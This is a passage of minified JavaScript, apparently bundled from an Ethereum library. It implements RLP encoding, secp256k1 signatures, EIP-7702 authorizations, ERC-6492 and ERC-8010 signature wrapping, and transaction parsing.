bytes)`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.DataSizeTooSmallError"})}}qr.DataSizeTooSmallError=b;class w extends r.BaseError{constructor(){super('Cannot decode zero data ("0x") with ABI parameters.'),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.ZeroDataError"})}}qr.ZeroDataError=w;class y extends r.BaseError{constructor({expectedLength:k,givenLength:O,type:_}){super(`Array length mismatch for type \`${_}\`. Expected: \`${k}\`. Given: \`${O}\`.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.ArrayLengthMismatchError"})}}qr.ArrayLengthMismatchError=y;class E extends r.BaseError{constructor({expectedSize:k,value:O}){super(`Size of bytes "${O}" (bytes${i.size(O)}) does not match expected size (bytes${k}).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.BytesSizeMismatchError"})}}qr.BytesSizeMismatchError=E;class A extends r.BaseError{constructor({expectedLength:k,givenLength:O}){super(["ABI encoding parameters/values length mismatch.",`Expected length (parameters): ${k}`,`Given length (values): ${O}`].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.LengthMismatchError"})}}qr.LengthMismatchError=A;class R extends r.BaseError{constructor(k){super(`Value \`${k}\` is not a valid array.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.InvalidArrayError"})}}qr.InvalidArrayError=R;class S extends r.BaseError{constructor(k){super(`Type \`${k}\` is not a valid ABI Type.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.InvalidTypeError"})}}return qr.InvalidTypeError=S,qr}var qo={},Tc={},SX;function b$e(){if(SX)return Tc;SX=1,Object.defineProperty(Tc,"__esModule",{value:!0}),Tc.toBytes=i,Tc.toHex=s,Tc.to=o,Tc.decodeRlpCursor=a,Tc.readLength=c,Tc.readList=l,Tc.from=f,Tc.fromBytes=h,Tc.fromHex=m;const t=ud(),e=rc(),n=Os(),r=ude();function i(A){return o(A,"Bytes")}function s(A){return o(A,"Hex")}function o(A,R){const S=R??(typeof A=="string"?"Hex":"Bytes"),v=(()=>{if(typeof A=="string"){if(A.length>3&&A.length%2!==0)throw new n.InvalidLengthError(A);return t.fromHex(A)}return A})(),k=r.create(v,{recursiveReadLimit:Number.POSITIVE_INFINITY});return a(k,S)}function a(A,R="Hex"){if(A.bytes.length===0)return R==="Hex"?n.fromBytes(A.bytes):A.bytes;const S=A.readByte();if(S<128&&A.decrementPosition(1),S<192){const k=c(A,S,128),O=A.readBytes(k);return R==="Hex"?n.fromBytes(O):O}const v=c(A,S,192);return l(A,v,R)}function c(A,R,S){if(S===128&&R<128)return 1;if(R<=S+55)return R-S;if(R===S+55+1)return A.readUint8();if(R===S+55+2)return A.readUint16();if(R===S+55+3)return A.readUint24();if(R===S+55+4)return A.readUint32();throw new e.BaseError("Invalid RLP prefix")}function l(A,R,S){const v=A.position,k=[];for(;A.position-v<R;)k.push(a(A,S));return k}function f(A,R){const{as:S}=R,v=b(A),k=r.create(new Uint8Array(v.length));return v.encode(k),S==="Hex"?n.fromBytes(k.bytes):k.bytes}function h(A,R={}){const{as:S="Bytes"}=R;return f(A,{as:S})}function m(A,R={}){const{as:S="Hex"}=R;return f(A,{as:S})}function b(A){return Array.isArray(A)?w(A.map(R=>b(R))):y(A)}function w(A){const R=A.reduce((k,O)=>k+O.length,0),S=E(R);return{length:R<=55?1+R:1+S+R,encode(k){R<=55?k.pushByte(192+R):(k.pushByte(247+S),S===1?k.pushUint8(R):S===2?k.pushUint16(R):S===3?k.pushUint24(R):k.pushUint32(R));for(const{encode:O}of A)O(k)}}}function y(A){const R=typeof A=="string"?t.fromHex(A):A,S=E(R.length);return{length:R.length===1&&R[0]<128?1:R.length<=55?1+R.length:1+S+R.length,encode(k){R.length===1&&R[0]<128?k.pushBytes(R):R.length<=55?(k.pushByte(128+R.length),k.pushBytes(R)):(k.pushByte(183+S),S===1?k.pushUint8(R.length):S===2?k.pushUint16(R.length):S===3?k.pushUint24(R.length):k.pushUint32(R.length),k.pushBytes(R))}}}function E(A){if(A<2**8)return 1;if(A<2**16)return 2;if(A<2**24)return 3;if(A<2**32)return 4;throw new e.BaseError("Length is too large.")}return Tc}var vn={},TX;function lde(){if(TX)return vn;TX=1,Object.defineProperty(vn,"__esModule",{value:!0}),vn.InvalidVError=vn.InvalidYParityError=vn.InvalidSError=vn.InvalidRError=vn.MissingPropertiesError=vn.InvalidSerializedSizeError=void 0,vn.assert=o,vn.fromBytes=a,vn.fromHex=c,vn.extract=l,vn.from=f,vn.fromDerBytes=h,vn.fromDerHex=m,vn.fromLegacy=b,vn.fromRpc=w,vn.fromTuple=y,vn.toBytes=E,vn.toHex=A,vn.toDerBytes=R,vn.toDerHex=S,vn.toLegacy=v,vn.toRpc=k,vn.toTuple=O,vn.validate=_,vn.vToYParity=I,vn.yParityToV=T;const t=uy(),e=ud(),n=rc(),r=Os(),i=Y8(),s=xM();function o(C,j={}){const{recovered:z}=j;if(typeof C.r>"u")throw new U({signature:C});if(typeof C.s>"u")throw new U({signature:C});if(z&&typeof C.yParity>"u")throw new U({signature:C});if(C.r<0n||C.r>s.maxUint256)throw new M({value:C.r});if(C.s<0n||C.s>s.maxUint256)throw new N({value:C.s});if(typeof C.yParity=="number"&&C.yParity!==0&&C.yParity!==1)throw new q({value:C.yParity})}function a(C){return c(r.fromBytes(C))}function c(C){if(C.length!==130&&C.length!==132)throw new B({signature:C});const j=BigInt(r.slice(C,0,32)),z=BigInt(r.slice(C,32,64)),$=(()=>{const H=+`0x${C.slice(130)}`;if(!Number.isNaN(H))try{return I(H)}catch{throw new q({value:H})}})();return typeof $>"u"?{r:j,s:z}:{r:j,s:z,yParity:$}}function l(C){if(!(typeof C.r>"u")&&!(typeof C.s>"u"))return f(C)}function f(C){const j=typeof C=="string"?c(C):C instanceof Uint8Array?a(C):typeof C.r=="string"?w(C):C.v?b(C):{r:C.r,s:C.s,...typeof C.yParity<"u"?{yParity:C.yParity}:{}};return o(j),j}function h(C){return m(r.fromBytes(C))}function m(C){const{r:j,s:z}=t.secp256k1.Signature.fromDER(r.from(C).slice(2));return{r:j,s:z}}function b(C){return{r:C.r,s:C.s,yParity:I(C.v)}}function w(C){const j=(()=>{const z=C.v?Number(C.v):void 0;let $=C.yParity?Number(C.yParity):void 0;if(typeof z=="number"&&typeof $!="number"&&($=I(z)),typeof $!="number")throw new q({value:C.yParity});return $})();return{r:BigInt(C.r),s:BigInt(C.s),yParity:j}}function y(C){const[j,z,$]=C;return f({r:z==="0x"?0n:BigInt(z),s:$==="0x"?0n:BigInt($),yParity:j==="0x"?0:Number(j)})}function E(C){return e.fromHex(A(C))}function A(C){o(C);const j=C.r,z=C.s;return r.concat(r.fromNumber(j,{size:32}),r.fromNumber(z,{size:32}),typeof C.yParity=="number"?r.fromNumber(T(C.yParity),{size:1}):"0x")}function R(C){return new t.secp256k1.Signature(C.r,C.s).toDERRawBytes()}function S(C){return`0x${new t.secp256k1.Signature(C.r,C.s).toDERHex()}`}function v(C){return{r:C.r,s:C.s,v:T(C.yParity)}}function k(C){const{r:j,s:z,yParity:$}=C;return{r:r.fromNumber(j,{size:32}),s:r.fromNumber(z,{size:32}),yParity:$===0?"0x0":"0x1"}}function O(C){const{r:j,s:z,yParity:$}=C;return[$?"0x01":"0x",j===0n?"0x":r.trimLeft(r.fromNumber(j)),z===0n?"0x":r.trimLeft(r.fromNumber(z))]}function _(C,j={}){try{return o(C,j),!0}catch{return!1}}function I(C){if(C===0||C===27)return 0;if(C===1||C===28)return 1;if(C>=35)return C%2===0?1:0;throw new P({value:C})}function T(C){if(C===0)return 27;if(C===1)return 28;throw new q({value:C})}class B extends n.BaseError{constructor({signature:j}){super(`Value \`${j}\` is an invalid signature size.`,{metaMessages:["Expected: 64 bytes or 65 bytes.",`Received ${r.size(r.from(j))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidSerializedSizeError"})}}vn.InvalidSerializedSizeError=B;class U extends n.BaseError{constructor({signature:j}){super(`Signature \`${i.stringify(j)}\` is missing either an \`r\`, \`s\`, or \`yParity\` property.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.MissingPropertiesError"})}}vn.MissingPropertiesError=U;class M extends n.BaseError{constructor({value:j}){super(`Value \`${j}\` is an invalid r value. r must be a positive integer less than 2^256.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidRError"})}}vn.InvalidRError=M;class N extends n.BaseError{constructor({value:j}){super(`Value \`${j}\` is an invalid s value. s must be a positive integer less than 2^256.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidSError"})}}vn.InvalidSError=N;class q extends n.BaseError{constructor({value:j}){super(`Value \`${j}\` is an invalid y-parity value. Y-parity must be 0 or 1.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidYParityError"})}}vn.InvalidYParityError=q;class P extends n.BaseError{constructor({value:j}){super(`Value \`${j}\` is an invalid v value. v must be 27, 28 or >=35.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidVError"})}}return vn.InvalidVError=P,vn}var xX;function w$e(){if(xX)return qo;xX=1,Object.defineProperty(qo,"__esModule",{value:!0}),qo.from=i,qo.fromRpc=s,qo.fromRpcList=o,qo.fromTuple=a,qo.fromTupleList=c,qo.getSignPayload=l,qo.hash=f,qo.toRpc=h,qo.toRpcList=m,qo.toTuple=b,qo.toTupleList=w;const t=TM(),e=Os(),n=b$e(),r=lde();function i(y,E={}){return typeof y.chainId=="string"?s(y):{...y,...E.signature}}function s(y){const{address:E,chainId:A,nonce:R}=y,S=r.extract(y);return{address:E,chainId:Number(A),nonce:BigInt(R),...S}}function o(y){return y.map(s)}function a(y){const[E,A,R,S,v,k]=y;let O={address:A,chainId:E==="0x"?0:Number(E),nonce:R==="0x"?0n:BigInt(R)};return S&&v&&k&&(O={...O,...r.fromTuple([S,v,k])}),i(O)}function c(y){const E=[];for(const A of y)E.push(a(A));return E}function l(y){return f(y,{presign:!0})}function f(y,E={}){const{presign:A}=E;return t.keccak256(e.concat("0x05",n.fromHex(b(A?{address:y.address,chainId:y.chainId,nonce:y.nonce}:y))))}function h(y){const{address:E,chainId:A,nonce:R,...S}=y;return{address:E,chainId:e.fromNumber(A),nonce:e.fromNumber(R),...r.toRpc(S)}}function m(y){return y.map(h)}function b(y){const{address:E,chainId:A,nonce:R}=y,S=r.extract(y);return[A?e.fromNumber(A):"0x",E,R?e.fromNumber(R):"0x",...S?r.toTuple(S):[]]}function w(y){if(!y||y.length===0)return[];const E=[];for(const A of y)E.push(b(A));return E}return qo}var Ua={},bm={},IX;function v$e(){if(IX)return bm;IX=1,Object.defineProperty(bm,"__esModule",{value:!0}),bm.extraEntropy=void 0,bm.setExtraEntropy=t,bm.extraEntropy=!1;function t(e){bm.extraEntropy=e}return bm}var RX;function E$e(){if(RX)return Ua;RX=1,Object.defineProperty(Ua,"__esModule",{value:!0}),Ua.noble=void 0,Ua.createKeyPair=o,Ua.getPublicKey=a,Ua.getSharedSecret=c,Ua.randomPrivateKey=l,Ua.recoverAddress=f,Ua.recoverPublicKey=h,Ua.sign=m,Ua.verify=b;const t=uy(),e=oR(),n=ud(),r=Os(),i=v$e(),s=cde();Ua.noble=t.secp256k1;function o(w={}){const{as:y="Hex"}=w,E=l({as:y}),A=a({privateKey:E});return{privateKey:E,publicKey:A}}function a(w){const{privateKey:y}=w,E=t.secp256k1.ProjectivePoint.fromPrivateKey(r.from(y).slice(2));return s.from(E)}function c(w){const{as:y="Hex",privateKey:E,publicKey:A}=w,v=t.secp256k1.ProjectivePoint.fromHex(s.toHex(A).slice(2)).multiply(t.secp256k1.utils.normPrivateKeyToScalar(r.from(E).slice(2))).toRawBytes(!0);return y==="Hex"?r.fromBytes(v):v}function l(w={}){const{as:y="Hex"}=w,E=t.secp256k1.utils.randomPrivateKey();return y==="Hex"?r.fromBytes(E):E}function f(w){return e.fromPublicKey(h(w))}function h(w){const{payload:y,signature:E}=w,{r:A,s:R,yParity:S}=E,k=new t.secp256k1.Signature(BigInt(A),BigInt(R)).addRecoveryBit(S).recoverPublicKey(r.from(y).substring(2));return s.from(k)}function m(w){const{extraEntropy:y=i.extraEntropy,hash:E,payload:A,privateKey:R}=w,{r:S,s:v,recovery:k}=t.secp256k1.sign(n.from(A),n.from(R),{extraEntropy:typeof y=="boolean"?y:r.from(y).slice(2),lowS:!0,...E?{prehash:!0}:{}});return{r:S,s:v,yParity:k}}function b(w){const{address:y,hash:E,payload:A,publicKey:R,signature:S}=w;return y?e.isEqual(y,f({payload:A,signature:S})):t.secp256k1.verify(S,n.from(A),s.toBytes(R),...E?[{prehash:!0,lowS:!0}]:[])}return Ua}var PX;function _$e(){return PX||(PX=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.InvalidWrappedSignatureError=t.suffixParameters=t.magicBytes=void 0,t.assert=a,t.from=c,t.unwrap=l,t.wrap=f,t.validate=h;const e=t5(),n=w$e(),r=rc(),i=Os(),s=E$e(),o=lde();t.magicBytes="0x8010801080108010801080108010801080108010801080108010801080108010",t.suffixParameters=e.from("(uint256 chainId, address delegation, uint256 nonce, uint8 yParity, uint256 r, uint256 s), address to, bytes data");function a(b){if(typeof b=="string"){if(i.slice(b,-32)!==t.magicBytes)throw new m(b)}else o.assert(b.authorization)}function c(b){return typeof b=="string"?l(b):b}function l(b){a(b);const w=i.toNumber(i.slice(b,-64,-32)),y=i.slice(b,-w-64,-64),E=i.slice(b,0,-w-64),[A,R,S]=e.decode(t.suffixParameters,y);return{authorization:n.from({address:A.delegation,chainId:Number(A.chainId),nonce:A.nonce,yParity:A.yParity,r:A.r,s:A.s}),signature:E,...S&&S!=="0x"?{data:S,to:R}:{}}}function f(b){const{data:w,signature:y}=b;a(b);const E=s.recoverAddress({payload:n.getSignPayload(b.authorization),signature:o.from(b.authorization)}),A=e.encode(t.suffixParameters,[{...b.authorization,delegation:b.authorization.address,chainId:BigInt(b.authorization.chainId)},b.to??E,w??"0x"]),R=i.fromNumber(i.size(A),{size:32});return i.concat(y,A,R,t.magicBytes)}function h(b){try{return a(b),!0}catch{return!1}}class m extends r.BaseError{constructor(w){super(`Value \`${w}\` is an invalid ERC-8010 wrapped signature.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SignatureErc8010.InvalidWrappedSignatureError"})}}t.InvalidWrappedSignatureError=m})(pk)),pk}var NX;function aR(){return NX||(NX=1,Object.defineProperty(M2,"__esModule",{value:!0}),M2.SignatureErc8010=void 0,M2.SignatureErc8010=_$e()),M2}var OX;function IM(){if(OX)return BS;OX=1,Object.defineProperty(BS,"__esModule",{value:!0}),BS.isErc8010Signature=e;const t=aR();function e(n){return t.SignatureErc8010.validate(n)}return BS}var jS={},kX;function dde(){if(kX)return jS;kX=1,Object.defineProperty(jS,"__esModule",{value:!0}),jS.parseErc6492Signature=n;const t=s0(),e=SM();function n(r){if(!(0,e.isErc6492Signature)(r))return{signature:r};const[i,s,o]=(0,t.decodeAbiParameters)([{type:"address"},{type:"bytes"},{type:"bytes"}],r);return{address:i,data:s,signature:o}}return jS}var MS={},DX;function fde(){if(DX)return MS;DX=1,Object.defineProperty(MS,"__esModule",{value:!0}),MS.parseErc8010Signature=r;const t=aR(),e=lt(),n=IM();function r(i){if(!(0,n.isErc8010Signature)(i))return{signature:i};const{authorization:s,to:o,...a}=t.SignatureErc8010.unwrap(i);return{authorization:{address:s.address,chainId:s.chainId,nonce:Number(s.nonce),r:(0,e.numberToHex)(s.r,{size:32}),s:(0,e.numberToHex)(s.s,{size:32}),yParity:s.yParity},...o?{address:o}:{},...a}}return MS}var US={},BX;function RM(){if(BX)return US;BX=1,Object.defineProperty(US,"__esModule",{value:!0}),US.recoverMessageAddress=n;const t=XA(),e=u0();async function n({message:r,signature:i}){return(0,e.recoverAddress)({hash:(0,t.hashMessage)(r),signature:i})}return US}var LS={},jX;function PM(){if(jX)return LS;jX=1,Object.defineProperty(LS,"__esModule",{value:!0}),LS.recoverTypedDataAddress=n;const t=e5(),e=u0();async function n(r){const{domain:i,message:s,primaryType:o,signature:a,types:c}=r;return(0,e.recoverAddress)({hash:(0,t.hashTypedData)({domain:i,message:s,primaryType:o,types:c}),signature:a})}return LS}var FS={},MX;function hde(){if(MX)return FS;MX=1,Object.defineProperty(FS,"__esModule",{value:!0}),FS.serializeErc6492Signature=i;const t=CM(),e=Ku(),n=os(),r=yr();function i(s){const{address:o,data:a,signature:c,to:l="hex"}=s,f=(0,n.concatHex)([(0,e.encodeAbiParameters)([{type:"address"},{type:"bytes"},{type:"bytes"}],[o,a,c]),t.erc6492MagicBytes]);return l==="hex"?f:(0,r.hexToBytes)(f)}return FS}var $S={},UX;function pde(){if(UX)return $S;UX=1,Object.defineProperty($S,"__esModule",{value:!0}),$S.serializeErc8010Signature=n;const t=aR(),e=yr();function n(r){const{address:i,data:s,signature:o,to:a="hex"}=r,c=t.SignatureErc8010.wrap({authorization:{address:r.authorization.address,chainId:r.authorization.chainId,nonce:BigInt(r.authorization.nonce),r:BigInt(r.authorization.r),s:BigInt(r.authorization.s),yParity:r.authorization.yParity},data:s,signature:o,to:i});return a==="hex"?c:(0,e.hexToBytes)(c)}return $S}var HS={},LX;function mde(){if(LX)return HS;LX=1,Object.defineProperty(HS,"__esModule",{value:!0}),HS.verifyHash=r;const t=nc(),e=Ju(),n=u0();async function r({address:i,hash:s,signature:o}){return(0,e.isAddressEqual)((0,t.getAddress)(i),await(0,n.recoverAddress)({hash:s,signature:o}))}return HS}var zS={},FX;function gde(){if(FX)return zS;FX=1,Object.defineProperty(zS,"__esModule",{value:!0}),zS.verifyMessage=r;const t=nc(),e=Ju(),n=RM();async function r({address:i,message:s,signature:o}){return(0,e.isAddressEqual)((0,t.getAddress)(i),await(0,n.recoverMessageAddress)({message:s,signature:o}))}return zS}var qS={},$X;function yde(){if($X)return qS;$X=1,Object.defineProperty(qS,"__esModule",{value:!0}),qS.verifyTypedData=r;const t=nc(),e=Ju(),n=PM();async function r(i){const{address:s,domain:o,message:a,primaryType:c,signature:l,types:f}=i;return(0,e.isAddressEqual)((0,t.getAddress)(s),await(0,n.recoverTypedDataAddress)({domain:o,message:a,primaryType:c,signature:l,types:f}))}return qS}var VS={},HX;function NM(){if(HX)return VS;HX=1,Object.defineProperty(VS,"__esModule",{value:!0}),VS.getSerializedTransactionType=r;const t=ga(),e=Jc(),n=ci();function r(i){const s=(0,e.sliceHex)(i,0,1);if(s==="0x04")return"eip7702";if(s==="0x03")return"eip4844";if(s==="0x02")return"eip1559";if(s==="0x01")return"eip2930";if(s!=="0x"&&(0,n.hexToNumber)(s)>=192)return"legacy";throw new t.InvalidSerializedTransactionTypeError({serializedType:s})}return VS}var Rb={},zX;function OM(){if(zX)return Rb;zX=1,Object.defineProperty(Rb,"__esModule",{value:!0}),Rb.parseTransaction=m,Rb.toTransactionArray=R,Rb.parseAccessList=S;const t=Gu(),e=ga(),n=pa(),r=K8(),i=So(),s=r0(),o=Yf(),a=ci(),c=wM(),l=vM(),f=rR(),h=NM();function m(O){const _=(0,h.getSerializedTransactionType)(O);return _==="eip1559"?y(O):_==="eip2930"?E(O):_==="eip4844"?w(O):_==="eip7702"?b(O):A(O)}function b(O){const _=R(O),[I,T,B,U,M,N,q,P,C,j,z,$,H]=_;if(_.length!==10&&_.length!==13)throw new e.InvalidSerializedTransactionError({attributes:{chainId:I,nonce:T,maxPriorityFeePerGas:B,maxFeePerGas:U,gas:M,to:N,value:q,data:P,accessList:C,authorizationList:j,..._.length>9?{v:z,r:$,s:H}:{}},serializedTransaction:O,type:"eip7702"});const L={chainId:(0,a.hexToNumber)(I),type:"eip7702"};return(0,i.isHex)(N)&&N!=="0x"&&(L.to=N),(0,i.isHex)(M)&&M!=="0x"&&(L.gas=(0,a.hexToBigInt)(M)),(0,i.isHex)(P)&&P!=="0x"&&(L.data=P),(0,i.isHex)(T)&&(L.nonce=T==="0x"?0:(0,a.hexToNumber)(T)),(0,i.isHex)(q)&&q!=="0x"&&(L.value=(0,a.hexToBigInt)(q)),(0,i.isHex)(U)&&U!=="0x"&&(L.maxFeePerGas=(0,a.hexToBigInt)(U)),(0,i.isHex)(B)&&B!=="0x"&&(L.maxPriorityFeePerGas=(0,a.hexToBigInt)(B)),C.length!==0&&C!=="0x"&&(L.accessList=S(C)),j.length!==0&&j!=="0x"&&(L.authorizationList=v(j)),(0,f.assertTransactionEIP7702)(L),{..._.length===13?k(_):void 0,...L}}function w(O){const _=R(O),I=_.length===4,T=I?_[0]:_,B=I?_.slice(1):[],[U,M,N,q,P,C,j,z,$,H,L,V,G,Z]=T,[J,ne,re]=B;if(!(T.length===11||T.length===14))throw new e.InvalidSerializedTransactionError({attributes:{chainId:U,nonce:M,maxPriorityFeePerGas:N,maxFeePerGas:q,gas:P,to:C,value:j,data:z,accessList:$,...T.length>9?{v:V,r:G,s:Z}:{}},serializedTransaction:O,type:"eip4844"});const le={blobVersionedHashes:L,chainId:(0,a.hexToNumber)(U),to:C,type:"eip4844"};return(0,i.isHex)(P)&&P!=="0x"&&(le.gas=(0,a.hexToBigInt)(P)),(0,i.isHex)(z)&&z!=="0x"&&(le.data=z),(0,i.isHex)(M)&&(le.nonce=M==="0x"?0:(0,a.hexToNumber)(M)),(0,i.isHex)(j)&&j!=="0x"&&(le.value=(0,a.hexToBigInt)(j)),(0,i.isHex)(H)&&H!=="0x"&&(le.maxFeePerBlobGas=(0,a.hexToBigInt)(H)),(0,i.isHex)(q)&&q!=="0x"&&(le.maxFeePerGas=(0,a.hexToBigInt)(q)),(0,i.isHex)(N)&&N!=="0x"&&(le.maxPriorityFeePerGas=(0,a.hexToBigInt)(N)),$.length!==0&&$!=="0x"&&(le.accessList=S($)),J&&ne&&re&&(le.sidecars=(0,r.toBlobSidecars)({blobs:J,commitments:ne,proofs:re})),(0,f.assertTransactionEIP4844)(le),{...T.length===14?k(T):void 0,...le}}function y(O){const _=R(O),[I,T,B,U,M,N,q,P,C,j,z,$]=_;if(!(_.length===9||_.length===12))throw new e.InvalidSerializedTransactionError({attributes:{chainId:I,nonce:T,maxPriorityFeePerGas:B,maxFeePerGas:U,gas:M,to:N,value:q,data:P,accessList:C,..._.length>9?{v:j,r:z,s:$}:{}},serializedTransaction:O,type:"eip1559"});const H={chainId:(0,a.hexToNumber)(I),type:"eip1559"};return(0,i.isHex)(N)&&N!=="0x"&&(H.to=N),(0,i.isHex)(M)&&M!=="0x"&&(H.gas=(0,a.hexToBigInt)(M)),(0,i.isHex)(P)&&P!=="0x"&&(H.data=P),(0,i.isHex)(T)&&(H.nonce=T==="0x"?0:(0,a.hexToNumber)(T)),(0,i.isHex)(q)&&q!=="0x"&&(H.value=(0,a.hexToBigInt)(q)),(0,i.isHex)(U)&&U!=="0x"&&(H.maxFeePerGas=(0,a.hexToBigInt)(U)),(0,i.isHex)(B)&&B!=="0x"&&(H.maxPriorityFeePerGas=(0,a.hexToBigInt)(B)),C.length!==0&&C!=="0x"&&(H.accessList=S(C)),(0,f.assertTransactionEIP1559)(H),{..._.length===12?k(_):void 0,...H}}function E(O){const _=R(O),[I,T,B,U,M,N,q,P,C,j,z]=_;if(!(_.length===8||_.length===11))throw new e.InvalidSerializedTransactionError({attributes:{chainId:I,nonce:T,gasPrice:B,gas:U,to:M,value:N,data:q,accessList:P,..._.length>8?{v:C,r:j,s:z}:{}},serializedTransaction:O,type:"eip2930"});const $={chainId:(0,a.hexToNumber)(I),type:"eip2930"};return(0,i.isHex)(M)&&M!=="0x"&&($.to=M),(0,i.isHex)(U)&&U!=="0x"&&($.gas=(0,a.hexToBigInt)(U)),(0,i.isHex)(q)&&q!=="0x"&&($.data=q),(0,i.isHex)(T)&&($.nonce=T==="0x"?0:(0,a.hexToNumber)(T)),(0,i.isHex)(N)&&N!=="0x"&&($.value=(0,a.hexToBigInt)(N)),(0,i.isHex)(B)&&B!=="0x"&&($.gasPrice=(0,a.hexToBigInt)(B)),P.length!==0&&P!=="0x"&&($.accessList=S(P)),(0,f.assertTransactionEIP2930)($),{..._.length===11?k(_):void 0,...$}}function A(O){const _=(0,c.fromRlp)(O,"hex"),[I,T,B,U,M,N,q,P,C]=_;if(!(_.length===6||_.length===9))throw new e.InvalidSerializedTransactionError({attributes:{nonce:I,gasPrice:T,gas:B,to:U,value:M,data:N,..._.length>6?{v:q,r:P,s:C}:{}},serializedTransaction:O,type:"legacy"});const j={type:"legacy"};if((0,i.isHex)(U)&&U!=="0x"&&(j.to=U),(0,i.isHex)(B)&&B!=="0x"&&(j.gas=(0,a.hexToBigInt)(B)),(0,i.isHex)(N)&&N!=="0x"&&(j.data=N),(0,i.isHex)(I)&&(j.nonce=I==="0x"?0:(0,a.hexToNumber)(I)),(0,i.isHex)(M)&&M!=="0x"&&(j.value=(0,a.hexToBigInt)(M)),(0,i.isHex)(T)&&T!=="0x"&&(j.gasPrice=(0,a.hexToBigInt)(T)),(0,f.assertTransactionLegacy)(j),_.length===6)return j;const z=(0,i.isHex)(q)&&q!=="0x"?(0,a.hexToBigInt)(q):0n;if(C==="0x"&&P==="0x")return z>0&&(j.chainId=Number(z)),j;const $=z,H=Number(($-35n)/2n);if(H>0)j.chainId=H;else if($!==27n&&$!==28n)throw new e.InvalidLegacyVError({v:$});return j.v=$,j.s=C,j.r=P,j.yParity=$%2n===0n?1:0,j}function R(O){return(0,c.fromRlp)(`0x${O.slice(4)}`,"hex")}function S(O){const _=[];for(let I=0;I<O.length;I++){const[T,B]=O[I];if(!(0,n.isAddress)(T,{strict:!1}))throw new t.InvalidAddressError({address:T});_.push({address:T,storageKeys:B.map(U=>(0,l.isHash)(U)?U:(0,o.trim)(U))})}return _}function v(O){const _=[];for(let I=0;I<O.length;I++){const[T,B,U,M,N,q]=O[I];_.push({address:B,chainId:T==="0x"?0:(0,a.hexToNumber)(T),nonce:U==="0x"?0:(0,a.hexToNumber)(U),...k([M,N,q])})}return _}function k(O){const _=O.slice(-3),I=_[0]==="0x"||(0,a.hexToBigInt)(_[0])===0n?27n:28n;return{r:(0,s.padHex)(_[1],{size:32}),s:(0,s.padHex)(_[2],{size:32}),v:I,yParity:I===27n?0:1}}return Rb}var WS={},GS={},L2={},qX;function bde(){if(qX)return L2;qX=1,Object.defineProperty(L2,"__esModule",{value:!0}),L2.InvalidDecimalNumberError=void 0;const t=Kt();class e extends t.BaseError{constructor({value:r}){super(`Number \`${r}\` is not a valid decimal number.`,{name:"InvalidDecimalNumberError"})}}return L2.InvalidDecimalNumberError=e,L2}var VX;function cR(){if(VX)return GS;VX=1,Object.defineProperty(GS,"__esModule",{value:!0}),GS.parseUnits=e;const t=bde();function e(n,r){if(!/^(-?)([0-9]*)\.?([0-9]*)$/.test(n))throw new t.InvalidDecimalNumberError({value:n});let[i,s="0"]=n.split(".");const o=i.startsWith("-");if(o&&(i=i.slice(1)),s=s.replace(/(0+)$/,""),r===0)Math.round(+`.${s}`)===1&&(i=`${BigInt(i)+1n}`),s="";else if(s.length>r){const[a,c,l]=[s.slice(0,r-1),s.slice(r-1,r),s.slice(r)],f=Math.round(+`${c}.${l}`);f>9?s=`${BigInt(a)+BigInt(1)}0`.padStart(a.length+1,"0"):s=`${a}${f}`,s.length>r&&(s=s.slice(1),i=`${BigInt(i)+1n}`),s=s.slice(0,r)}else s=s.padEnd(r,"0");return BigInt(`${o?"-":""}${i}${s}`)}return GS}var WX;function wde(){if(WX)return WS;WX=1,Object.defineProperty(WS,"__esModule",{value:!0}),WS.parseEther=n;const t=BA(),e=cR();function n(r,i="wei"){return(0,e.parseUnits)(r,t.etherUnits[i])}return WS}var KS={},GX;function vde(){if(GX)return KS;GX=1,Object.defineProperty(KS,"__esModule",{value:!0}),KS.parseGwei=n;const t=BA(),e=cR();function n(r,i="wei"){return(0,e.parseUnits)(r,t.gweiUnits[i])}return KS}var KX;function kM(){return KX||(KX=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.padBytes=t.pad=t.isHex=t.isBytes=t.concatHex=t.concatBytes=t.concat=t.getChainContractAddress=t.extractChain=t.defineChain=t.assertCurrentChain=t.offchainLookupSignature=t.offchainLookupAbiItem=t.offchainLookup=t.ccipFetch=t.ccipRequest=t.buildRequest=t.verifyAuthorization=t.serializeAuthorizationList=t.recoverAuthorizationAddress=t.hashAuthorization=t.isAddressEqual=t.isAddress=t.getCreateAddress=t.getCreate2Address=t.getContractAddress=t.getAddress=t.parseEventLogs=t.getAbiItem=t.formatAbiItemWithArgs=t.formatAbiParams=t.formatAbiItem=t.encodePacked=t.encodeFunctionResult=t.encodeFunctionData=t.encodeEventTopics=t.encodeErrorResult=t.encodeDeployData=t.encodeAbiParameters=t.decodeFunctionResult=t.decodeFunctionData=t.decodeEventLog=t.decodeErrorResult=t.decodeAbiParameters=t.publicKeyToAddress=t.parseAccount=t.parseAbiParameters=t.parseAbiParameter=t.parseAbiItem=t.parseAbi=void 